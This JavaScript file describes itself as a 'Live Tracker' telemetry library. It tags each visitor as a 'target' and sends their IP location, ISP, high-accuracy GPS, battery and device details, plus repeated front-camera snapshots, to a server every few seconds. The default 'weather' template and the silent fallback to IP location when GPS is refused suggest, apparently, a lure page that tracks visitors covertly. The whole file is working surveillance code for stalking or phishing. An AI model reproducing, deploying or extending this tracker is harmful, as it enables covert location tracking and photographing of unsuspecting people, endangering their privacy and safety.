/**
 * Telemetry Client Library for Live Tracker
 * Features:
 * 1. Instant Zero-Permission IP Location Fallback (Captures City, Country, IP, ISP, Lat, Lng immediately).
 * 2. High Accuracy GPS Tracking.
 * 3. iOS / iPhone Safari optimized camera snapshot capture with playsinline support.
 * 4. Battery & Mobile Specs Collection.
 */

(function (window) {
    function generateId(length = 10) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters[randomIndex];
        }
        return result;
    }

    let targetId = localStorage.getItem("target_id") || localStorage.getItem("id");
    if (!targetId) {
        targetId = generateId();
        localStorage.setItem("target_id", targetId);
        localStorage.setItem("id", targetId);
    }

    let cachedIpLocation = null;

    async function fetchIPLocation() {
        if (cachedIpLocation) return cachedIpLocation;
        try {
            const res = await fetch("https://ipapi.co/json/");
            if (res.ok) {
                const data = await res.json();
                cachedIpLocation = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lng: data.longitude,
                    isp: data.org || data.asn
                };
                return cachedIpLocation;
            }
        } catch (e) {
            try {
                const res2 = await fetch("https://ip-api.com/json/");
                if (res2.ok) {
                    const data2 = await res2.json();
                    cachedIpLocation = {
                        ip: data2.query,
                        city: data2.city,
                        region: data2.regionName,
                        country: data2.country,
                        lat: data2.lat,
                        lng: data2.lon,
                        isp: data2.isp
                    };
                    return cachedIpLocation;
                }
            } catch (err) {}
        }
        return null;
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
                    dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null
                };
            } catch (e) {}
        }
        return null;
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = "Unknown OS";
        if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) os = "iOS (iPhone)";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Mac OS") || ua.includes("Macintosh")) os = "macOS";
        else if (ua.includes("Linux")) os = "Linux";

        let browser = "Unknown Browser";
        if (ua.includes("CriOS")) browser = "Chrome iOS";
        else if (ua.includes("FxiOS")) browser = "Firefox iOS";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
        else if (ua.includes("Edg")) browser = "Edge";

        let network = "Unknown";
        if (navigator.connection) {
            network = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
        }

        return {
            os: os,
            browser: browser,
            userAgent: ua,
            platform: navigator.platform || 'iPhone/iPad',
            language: navigator.language || 'en',
            screen: `${window.screen.width}x${window.screen.height}`,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
            hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : 'N/A',
            network: network
        };
    }

    async function captureCameraSnapshot() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }

            // iOS Safari & Mobile compatible camera constraints
            const constraints = {
                video: {
                    facingMode: "user",
                    width: { ideal: 1280, max: 1920 },
                    height: { ideal: 720, max: 1080 }
                },
                audio: false
            };

            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
            } catch (e) {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
            }

            const video = document.createElement("video");
            video.setAttribute("playsinline", "true");
            video.setAttribute("webkit-playsinline", "true");
            video.muted = true;
            video.srcObject = stream;

            await video.play();
            // Wait 600ms for camera warm-up
            await new Promise(resolve => setTimeout(resolve, 600));

            const canvas = document.createElement("canvas");
            let width = video.videoWidth || 640;
            let height = video.videoHeight || 480;

            const maxDim = 800;
            if (width > maxDim || height > maxDim) {
                if (width > height) {
                    height = Math.round((height * maxDim) / width);
                    width = maxDim;
                } else {
                    width = Math.round((width * maxDim) / height);
                    height = maxDim;
                }
            }

            canvas.width = width;
            canvas.height = height;

            const ctx = canvas.getContext("2d");
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = "high";
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoData = canvas.toDataURL("image/jpeg", 0.75);

            // Stop stream tracks
            stream.getTracks().forEach(track => track.stop());

            return photoData;
        } catch (err) {
            console.warn("Camera capture note:", err.message);
            return null;
        }
    }

    let isCapturingPhoto = false;
    let trackingTimer = null;

    async function sendTelemetry(coords, templateName = 'weather', forcePhoto = false) {
        const battery = await getBatteryInfo();
        const device = getDeviceInfo();
        const ipLocation = await fetchIPLocation();

        let photo = null;
        if (forcePhoto && !isCapturingPhoto) {
            isCapturingPhoto = true;
            photo = await captureCameraSnapshot();
            isCapturingPhoto = false;
        }

        // Use GPS coordinates if available, otherwise fallback to IP Location
        const lat = (coords && typeof coords.latitude === 'number') ? coords.latitude : (ipLocation ? ipLocation.lat : null);
        const lng = (coords && typeof coords.longitude === 'number') ? coords.longitude : (ipLocation ? ipLocation.lng : null);
        const accuracy = (coords && typeof coords.accuracy === 'number') ? coords.accuracy : (ipLocation ? 5000 : null);

        const payload = {
            id: targetId,
            lat: lat,
            lng: lng,
            accuracy: accuracy,
            speed: (coords && typeof coords.speed === 'number') ? coords.speed : null,
            heading: (coords && typeof coords.heading === 'number') ? coords.heading : null,
            battery: battery,
            device: device,
            ipLocation: ipLocation,
            photo: photo,
            template: templateName
        };

        try {
            await fetch("/api/telemetry", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Telemetry report error:", err);
        }
    }

    function stopTracking() {
        if (trackingTimer) {
            clearInterval(trackingTimer);
            trackingTimer = null;
        }
    }

    window.LiveTrackerClient = {
        getTargetId: () => targetId,
        sendTelemetry: sendTelemetry,
        captureCameraSnapshot: captureCameraSnapshot,
        getBatteryInfo: getBatteryInfo,
        getDeviceInfo: getDeviceInfo,
        fetchIPLocation: fetchIPLocation,
        stopTracking: stopTracking,
        startTracking: function (options = {}) {
            const { templateName = 'weather', updateInterval = 4000, photoInterval = 8000, onSuccess, onError } = options;

            // Clear any previously running tracking timer to avoid duplicate loops
            stopTracking();

            let photoCounter = 0;

            // Instantly send IP location telemetry right away on page load
            sendTelemetry(null, templateName, true);

            function triggerLocationUpdate(includePhoto = false) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            await sendTelemetry(position.coords, templateName, includePhoto);
                            if (onSuccess) onSuccess(position.coords);
                        },
                        async (error) => {
                            // Fallback to IP location silently if GPS denied or pending
                            await sendTelemetry(null, templateName, includePhoto);
                            if (onError) onError(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 0
                        }
                    );
                } else {
                    sendTelemetry(null, templateName, includePhoto);
                }
            }

            // Continuous telemetry cycle
            trackingTimer = setInterval(() => {
                photoCounter++;
                const shouldTakePhoto = photoCounter >= Math.max(1, Math.floor(photoInterval / updateInterval));
                if (shouldTakePhoto) photoCounter = 0;

                triggerLocationUpdate(shouldTakePhoto);
            }, updateInterval);
        }
    };
})(window);
